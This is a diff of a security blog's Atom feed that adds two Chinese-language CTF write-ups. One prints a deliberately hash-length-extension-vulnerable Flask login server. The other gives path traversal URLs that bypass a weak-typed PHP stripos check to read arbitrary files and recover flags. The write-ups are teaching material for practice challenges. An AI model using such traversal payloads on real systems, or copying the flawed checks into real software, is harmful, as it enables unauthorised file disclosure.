@@ -194,58 +194,31 @@
   </entry>
   
   <entry>
-    <title>浅尝哈希长度扩展攻击</title>
-    <link href="http://chybeta.github.io/2017/09/26/%E6%B5%85%E5%B0%9D%E5%93%88%E5%B8%8C%E9%95%BF%E5%BA%A6%E6%89%A9%E5%B1%95%E6%94%BB%E5%87%BB/"/>
-    <id>http://chybeta.github.io/2017/09/26/浅尝哈希长度扩展攻击/</id>
-    <published>2017-09-26T08:43:11.000Z</published>
-    <updated>2017-09-26T15:20:10.984Z</updated>
+    <title>BackdoorCTF 2017-Extends Me-writeup</title>
+    <link href="http://chybeta.github.io/2017/09/28/BackdoorCTF-2017-Extends-Me-writeup/"/>
+    <id>http://chybeta.github.io/2017/09/28/BackdoorCTF-2017-Extends-Me-writeup/</id>
+    <published>2017-09-28T04:55:04.000Z</published>
+    <updated>2017-09-28T05:00:08.215Z</updated>
     
-    <content type="html"><![CDATA[<h1 id="哈希长度扩展攻击"><a href="#哈希长度扩展攻击" class="headerlink" title="哈希长度扩展攻击"></a>哈希长度扩展攻击</h1><h1 id="场景"><a href="#场景" class="headerlink" title="场景"></a>场景</h1><h1 id="防范"><a href="#防范" class="headerlink" title="防范"></a>防范</h1><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ul>
-<li><a href="http://blog.csdn.net/syh_486_007/article/details/51228628" target="_blank" rel="external">hash哈希长度扩展攻击解析</a></li>
-<li><a href="http://www.freebuf.com/articles/web/69264.html" target="_blank" rel="external">深入理解hash长度扩展攻击（sha1为例）</a></li>
-<li><a href="http://www.freebuf.com/articles/web/31756.html" target="_blank" rel="external">科普哈希长度扩展攻击(Hash Length Extension Attacks) </a></li>
-<li><a href="http://www.cnblogs.com/pcat/p/5478509.html" target="_blank" rel="external">哈希长度扩展攻击的简介以及HashPump安装使用方法</a></li>
-<li><a href="http://blog.nsfocus.net/hash-length-extension-attack/" target="_blank" rel="external">哈希长度扩展攻击</a></li>
-<li><a href="https://joychou.org/web/hash-length-extension-attack.html" target="_blank" rel="external">Hash Length Extension Attack </a></li>
-<li><a href="http://blog.chinaunix.net/uid-27070210-id-3255947.html" target="_blank" rel="external"> Understanding MD5 Length Extension Attack </a></li>
-<li><a href="https://zh.wikipedia.org/wiki/%E9%95%BF%E5%BA%A6%E6%89%A9%E5%B1%95%E6%94%BB%E5%87%BB" target="_blank" rel="external">维基百科：长度扩展攻击</a></li>
-</ul>
+    <content type="html"><![CDATA[<h1 id="Task"><a href="#Task" class="headerlink" title="Task"></a>Task</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">Extends Me</div><div class="line">https://extend-me-please.herokuapp.com/login</div></pre></td></tr></table></figure>
+<h1 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h1><p>题目提供了源码，如下：<br>server.py:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> *</div><div class="line"><span class="keyword">from</span> hash <span class="keyword">import</span> SLHA1</div><div class="line">app = Flask(__name__)</div><div class="line"></div><div class="line">key = file(<span class="string">'SECRET'</span>).read().strip()</div><div class="line"></div><div class="line"><span class="meta">@app.route('/')</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">root</span><span class="params">()</span>:</span></div><div class="line">	<span class="keyword">return</span> redirect(url_for(<span class="string">'login'</span>))</div><div class="line"></div><div class="line"><span class="meta">@app.route('/login',methods = ['GET', 'POST'])</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">()</span>:</span></div><div class="line">	<span class="keyword">if</span> request.method == <span class="string">'POST'</span>:</div><div class="line">		<span class="keyword">if</span>  <span class="keyword">not</span> request.form.get(<span class="string">'username'</span>):</div><div class="line">			<span class="keyword">return</span> render_template(<span class="string">'login.html'</span>)</div><div class="line">		<span class="keyword">else</span>:</div><div class="line">			username = str(request.form.get(<span class="string">'username'</span>))</div><div class="line">			<span class="keyword">if</span> request.cookies.get(<span class="string">'data'</span>) <span class="keyword">and</span> request.cookies.get(<span class="string">'user'</span>):</div><div class="line">				data = str(request.cookies.get(<span class="string">'data'</span>)).decode(<span class="string">'base64'</span>).strip()</div><div class="line">				user = str(request.cookies.get(<span class="string">'user'</span>)).decode(<span class="string">'base64'</span>).strip()				</div><div class="line">				temp = <span class="string">'|'</span>.join([key,username,user])</div><div class="line">				<span class="keyword">if</span> data != SLHA1(temp).digest():</div><div class="line">					temp = SLHA1(temp).digest().encode(<span class="string">'base64'</span>).strip().replace(<span class="string">'\n'</span>,<span class="string">''</span>)</div><div class="line">					resp = make_response(render_template(<span class="string">'welcome_new.html'</span>,name = username))</div><div class="line">					resp.set_cookie(<span class="string">'user'</span>,<span class="string">'user'</span>.encode(<span class="string">'base64'</span>).strip())</div><div class="line">					resp.set_cookie(<span class="string">'data'</span>,temp)</div><div class="line">					<span class="keyword">return</span> resp</div><div class="line">				<span class="keyword">else</span>:</div><div class="line">					<span class="keyword">if</span> <span class="string">'admin'</span> <span class="keyword">in</span> user: <span class="comment"># too lazy to check properly :p</span></div><div class="line">						<span class="keyword">return</span> <span class="string">"Here you go : CTF&#123;XXXXXXXXXXXXXXXXXXXXXXXXX&#125;"</span></div><div class="line">					<span class="keyword">else</span>:</div><div class="line">						<span class="keyword">return</span> render_template(<span class="string">'welcome_back.html'</span>,name = username)</div><div class="line">			<span class="keyword">else</span>:</div><div class="line">				resp = make_response(render_template(<span class="string">'welcome_new.html'</span>,name = username))</div><div class="line">				temp = <span class="string">'|'</span>.join([key,username,<span class="string">'user'</span>])</div><div class="line">				resp.set_cookie(<span class="string">'data'</span>,SLHA1(temp).digest().encode(<span class="string">'base64'</span>).strip().replace(<span class="string">'\n'</span>,<span class="string">''</span>))</div><div class="line">				resp.set_cookie(<span class="string">'user'</span>,<span class="string">'user'</span>.encode(<span class="string">'base64'</span>).strip())</div><div class="line">				<span class="keyword">return</span> resp</div><div class="line"></div><div class="line">	<span class="keyword">else</span>:</div><div class="line">		<span class="keyword">return</span> render_template(<span class="string">'login.html'</span>)</div><div class="line"></div><div class="line"><span class="meta">@app.route('/logout')</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">logout</span><span class="params">()</span>:</span></div><div class="line">	resp = make_response(render_template(<span class="string">'login.html'</span>))</div><div class="line">	resp.set_cookie(<span class="string">'data'</span>,<span class="string">''</span>,expires=<span class="number">0</span>)</div><div class="line">	resp.set_cookie(<span class="string">'user'</span>,<span class="string">''</span>,expires=<span class="number">0</span>)</div><div class="line">	<span class="keyword">return</span> (resp)</div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__==<span class="string">"__main__"</span>:</div><div class="line">	app.run()</div></pre></td></tr></table></figure></p>
+<p>还有hash.py，鉴于太长，这里就不贴出来了，可以见这：<a href="https://github.com/CHYbeta/Code-Audit-Challenges/blob/master/python/challenge-1.md" target="_blank" rel="external">Code-Audit-Challenges-python:1</a></p>
 ]]></content>
     
     <summary type="html">
     
-      &lt;h1 id=&quot;哈希长度扩展攻击&quot;&gt;&lt;a href=&quot;#哈希长度扩展攻击&quot; class=&quot;headerlink&quot; title=&quot;哈希长度扩展攻击&quot;&gt;&lt;/a&gt;哈希长度扩展攻击&lt;/h1&gt;&lt;h1 id=&quot;场景&quot;&gt;&lt;a href=&quot;#场景&quot; class=&quot;headerlink&quot; titl
+      &lt;h1 id=&quot;Task&quot;&gt;&lt;a href=&quot;#Task&quot; class=&quot;headerlink&quot; title=&quot;Task&quot;&gt;&lt;/a&gt;Task&lt;/h1&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pr
     
     </summary>
     
-      <category term="Web Security" scheme="http://chybeta.github.io/categories/Web-Security/"/>
+      <category term="writeup:Web" scheme="http://chybeta.github.io/categories/writeup-Web/"/>
     
     
-      <category term="php" scheme="http://chybeta.github.io/tags/php/"/>
+      <category term="CTF" scheme="http://chybeta.github.io/tags/CTF/"/>
     
-      <category term="哈希长度扩展攻击" scheme="http://chybeta.github.io/tags/%E5%93%88%E5%B8%8C%E9%95%BF%E5%BA%A6%E6%89%A9%E5%B1%95%E6%94%BB%E5%87%BB/"/>
+      <category term="writeup" scheme="http://chybeta.github.io/tags/writeup/"/>
     
-  </entry>
-  
-  <entry>
-    <title>PHPSHEv1.5 moneylog.php SQL注入 分析</title>
-    <link href="http://chybeta.github.io/2017/09/21/PHPSHEv1-5-moneylog-php-SQL%E6%B3%A8%E5%85%A5-%E5%88%86%E6%9E%90/"/>
-    <id>http://chybeta.github.io/2017/09/21/PHPSHEv1-5-moneylog-php-SQL注入-分析/</id>
-    <published>2017-09-21T12:24:56.000Z</published>
-    <updated>2017-09-21T12:49:10.716Z</updated>
-    
-    <summary type="html">
-    
-    </summary>
-    
-      <category term="Web Security" scheme="http://chybeta.github.io/categories/Web-Security/"/>
-    
-    
-      <category term="代码审计" scheme="http://chybeta.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
-    
-      <category term="php" scheme="http://chybeta.github.io/tags/php/"/>
-    
-      <category term="sql注入" scheme="http://chybeta.github.io/tags/sql%E6%B3%A8%E5%85%A5/"/>
+      <category term="web" scheme="http://chybeta.github.io/tags/web/"/>
     
   </entry>
   
@@ -1120,6 +1093,52 @@
       <category term="writeup" scheme="http://chybeta.github.io/tags/writeup/"/>
     
       <category term="re" scheme="http://chybeta.github.io/tags/re/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>TWCTF 2017-Freshen Uploader-writeup</title>
+    <link href="http://chybeta.github.io/2017/09/02/TWCTF-2017-Freshen-Uploader-writeup/"/>
+    <id>http://chybeta.github.io/2017/09/02/TWCTF-2017-Freshen-Uploader-writeup/</id>
+    <published>2017-09-02T02:33:13.000Z</published>
+    <updated>2017-09-03T14:03:40.866Z</updated>
+    
+    <content type="html"><![CDATA[<p>TWCTF 2017-Freshen Uploader-writeup<br>任意文件读取漏洞。php弱类型比较。<br><a id="more"></a></p>
+<h1 id="Task"><a href="#Task" class="headerlink" title="Task"></a>Task</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">In this year, we stopped using Windows so you can&apos;t use DOS tricks!</div><div class="line">http://fup.chal.ctf.westerns.tokyo/</div></pre></td></tr></table></figure>
+<h1 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h1><p>该题有两个flag。</p>
+<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170902/1.png?raw=true" alt=""></p>
+<p>有下载功能，比如点击第一个download后，链接为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://fup.chal.ctf.westerns.tokyo/download.php?f=6a92b449761226434f5fce6c8e87295a</div></pre></td></tr></table></figure></p>
+<p>这里存在任意文件读取漏洞。访问：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://fup.chal.ctf.westerns.tokyo/download.php?f=../download.php</div></pre></td></tr></table></figure></p>
+<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170902/2.png?raw=true" alt=""></p>
+<p>得到download.php的源代码和第一个flag：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">TWCTF&#123;then_can_y0u_read_file_list?&#125;</div></pre></td></tr></table></figure></p>
+<p>file_list是什么东西？我们读取一下index.php看看：</p>
+<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170902/3.png?raw=true" alt=""></p>
+<p>根据第一个flag，我们可以猜测第二个flag藏在file_list.php中。但直接读取是不行的，因为download.php的源码用stripos做了检测：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="comment">// TWCTF&#123;then_can_y0u_read_file_list?&#125;</span></div><div class="line">$filename = $_GET[<span class="string">'f'</span>];</div><div class="line"><span class="keyword">if</span>(stripos($filename, <span class="string">'file_list'</span>) != <span class="keyword">false</span>) <span class="keyword">die</span>();</div><div class="line">header(<span class="string">"Content-Type: application/octet-stream"</span>);</div><div class="line">header(<span class="string">"Content-Disposition: attachment; filename='$filename'"</span>);</div><div class="line">readfile(<span class="string">"uploads/$filename"</span>);</div></pre></td></tr></table></figure>
+<p>仔细看一下判断语句：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">if(stripos($filename, &apos;file_list&apos;) != false) die();</div></pre></td></tr></table></figure></p>
+<p>strpos(str1,str2)返回字符串str2在字符串str1中的位置。如果<code>$filename</code>以<code>file_list</code>开头，则<code>stripos($filename, &#39;file_list&#39;)</code>会返回0，而采用的是<code>!=</code>，也就是说可能存在弱类型比较问题:<code>0 == false</code>。</p>
+<p>绕过了stripos，怎么读取file_list文件？构造payload：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://fup.chal.ctf.westerns.tokyo/download.php?f=file_list/../../file_list.php</div></pre></td></tr></table></figure></p>
+<p>这样它会把第一个file_list当成文件夹，之后用两个<code>../</code>返回上一层文件夹，并最终读取到file_list.php。</p>
+<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170902/4.png?raw=true" alt=""></p>
+<p>访问：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://fup.chal.ctf.westerns.tokyo/download.php?f=flag_ef02dee64eb575d84ba626a78ad4e0243aeefd19145bc6502efe7018c4085213</div></pre></td></tr></table></figure></p>
+<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170902/5.png?raw=true" alt=""></p>
+<p>第二个flag：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">TWCTF&#123;php_is_very_secure&#125;</div></pre></td></tr></table></figure></p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;TWCTF 2017-Freshen Uploader-writeup&lt;br&gt;任意文件读取漏洞。php弱类型比较。&lt;br&gt;
+    
+    </summary>
+    
+      <category term="writeup:Web" scheme="http://chybeta.github.io/categories/writeup-Web/"/>
+    
+    
+      <category term="CTF" scheme="http://chybeta.github.io/tags/CTF/"/>
+    
+      <category term="writeup" scheme="http://chybeta.github.io/tags/writeup/"/>
+    
+      <category term="web" scheme="http://chybeta.github.io/tags/web/"/>
     
   </entry>
   
